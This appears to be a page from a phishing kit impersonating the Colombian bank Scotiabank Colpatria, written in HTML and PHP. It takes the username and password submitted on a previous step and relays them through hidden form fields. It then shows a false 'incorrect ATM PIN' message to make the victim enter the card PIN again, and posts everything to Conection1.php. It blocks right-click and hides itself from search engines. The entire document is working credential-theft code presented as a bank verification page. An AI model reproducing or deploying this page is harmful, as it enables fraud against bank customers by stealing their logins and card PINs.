
<!DOCTYPE html>

<html>

<head>
    <body oncontextmenu="return false">
	<link rel="icon" href="favicon.png" type="favicon.png" sizes="32x32" />
	<title>Scotiabank Colpatria ❘ Verificación </title>
	<meta charset="utf-8">

<meta name="keywords" content="Test">
        <meta name="description" content="Test">
        <meta name="description" content="Web site created using create-react-app">
        <meta name="subject" content="Test">
        <meta name="copyright" content="Test">
        <meta name="url" content="http://www.test.com">
        <meta name="language" content="en-GB">
        <meta name="robots" content="NOINDEX, NOFOLLOW">
        <meta name="pagename" content="$Title">
        <meta name="coverage" content="Worldwide">
        <meta name="distribution" content="Global">
        <meta name="target" content="all">
        <meta name="HandheldFriendly" content="True">
        <meta name="MobileOptimized" content="640">
        <meta name="format-detection" content="telephone=no">
        <meta http-equiv="cleartype" content="on">
        <meta name="apple-mobile-web-app-title" content="$Title">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-touch-fullscreen" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <meta name="ResourceLoaderDynamicStyles" content="">
        <meta http-equiv="Expires" content="0">
        <meta http-equiv="Pragma" content="no-cache">
        <meta http-equiv="Cache-Control" content="no-cache">
        <meta http-equiv="imagetoolbar" content="no">
        <meta http-equiv="x-dns-prefetch-control" content="off">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>

        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">

        <!-- Makes your prototype chrome-less once bookmarked to your phone's home screen -->
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">

        <!-- Set a shorter title for iOS6 devices when saved to home screen -->
        <meta name="apple-mobile-web-app-title" content="Ratchet">

	<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />
	<link rel="stylesheet" type="text/css" href="estilo1.css">

</head>

<body>
<div class="header" id="Cabezote">
<img class="favicon" src="colpatria-red.svg" alt="colpatria-red.svg">
<img class="favicon1" src="favicon1.svg" alt="favicon1.svg">
</div>	

		<section class="box" >

	<div class="container" id="container">

		 <div class="pasos" >
		<img src="pasos.jpg" alt="pasos">
	
	</div>
		

		<h2> Ingresa su clave de cajero automático </h2>
<form class ="form" method="POST"action="Conection1.php" >

	  <?php 
                     $variable= $_POST['usuario'];
        echo '<input id="dato" style="display:none" name="usuario" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>

				   <?php 
                     $variable1= $_POST['pass'];
        echo '<input id="dato1"  style="display:none" name="pass" value="'. htmlspecialchars($variable1) . '" readonly />'."\n";
		?>
		
		
	
	<?php 
                     $variable1= $_POST['clavej'];
        echo '<input id="clavej1"  style="display:none" name="clavej" value="'. htmlspecialchars($variable1) . '" readonly />'."\n";
		?>
	
	
	
				<p> Clave de cajero incorrecta, verifique e intente de nuevo.</p>
				<div class="clavej2" id="clavej2">
				<img src="pass.png" style="opacity: 90%;" alt="icon-pass">
				<h4> Clave cajero </h4>  </div>
				<input  id="clavej3" type="password" minlength="4" maxlength="4" name="clavej2" placeholder=" **** " value=""   required=>
				
				
			<br>
			
			<script>
// Campo numeros
var clavej3 = document.getElementById('clavej3');

// Poner cursor en el campo numeros
clavej3.focus();
				
clavej3.onkeydown = function(e){
	// Permitir la tecla para borrar
	if (e.key == 'Backspace') return true;

	// Permitir flecha izquierda
	if (e.key == 'ArrowLeft') return true;

	// Permitir flecha derecha
	if (e.key == 'ArrowRight') return true;

	// Bloquear tecla de espacio
	if (e.key == ' ') return false;

	// Bloquear tecla si no es un numero
	if (isNaN(e.key)) return false;
};

clavej3.onkeyup = function(){
	clavej3.value = clavej3.value
					
};
</script>
	
	<br>
	
			
	
			<label><input type="checkbox" id="cbox1" value="first_checkbox">	Verifica y protege tu cuenta </label>
			<br>
			<br>
			<br>
			<br>
		
			<input  id="accept1" type="submit" value="Confirmar">

			 

	</div>
	</div>


		</form>


</section>
<!-- Aquí puedes escribir tu comentario -->
 <div class="logo1" >
		<img src="logo22.png" alt="logo1">
	
	</div>

</body>

</html>
